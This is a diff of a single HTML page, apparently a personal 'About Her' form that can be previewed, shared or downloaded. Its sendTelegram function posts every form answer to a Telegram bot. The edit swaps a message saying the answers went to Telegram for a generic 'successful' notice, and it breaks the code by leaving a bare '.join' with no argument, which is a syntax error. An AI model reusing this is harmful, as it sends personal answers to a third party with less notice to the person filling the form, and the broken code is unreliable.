@@ -109,6 +109,6 @@ document.getElementById("pv").onclick=()=>window.open(URL.createObjectURL(blob()
 document.getElementById("sh").onclick=async()=>{const file=new File([blob()],fname,{type:"text/html"});
 try{if(navigator.canShare&&navigator.canShare({files:[file]})){await navigator.share({files:[file],title:"My Moon 💜"});rs.textContent="📤 Share වුණා 💜"}else{document.getElementById("dl").click();rs.textContent="ඔයාගේ device එකේ share support නෑ, file එක download කළා 💜"}}catch(x){rs.textContent="Share cancel වුණා."}};
 async function sendTelegram(){if(BOT_TOKEN.includes("PASTE_")||CHAT_ID.includes("PASTE_"))return;
-const msg="💜 NEW ABOUT HER FORM 💜\n"+FIELDS.map(([k,i,l])=>`${i} ${l}: ${v(k)}`).join("\n");
-try{const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:msg})});const d=await r.json();rs.textContent=d.ok?"✅ Telegram එකටත් ගියා 💜":"⚠️ Telegram: Token / Chat ID බලන්න."}catch(x){}}
+const msg="💜 NEW ABOUT HER FORM 💜\n"+FIELDS.map(([k,i,l])=>`${i} ${l}: ${v(k)}`).join 
+try{const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:msg})});const d=await r.json();rs.textContent=d.ok?"✅ සාර්ථකයි💜...":"⚠️ Telegram: Token / Chat ID බලන්න."}catch(x){}}
 </script></body></html>
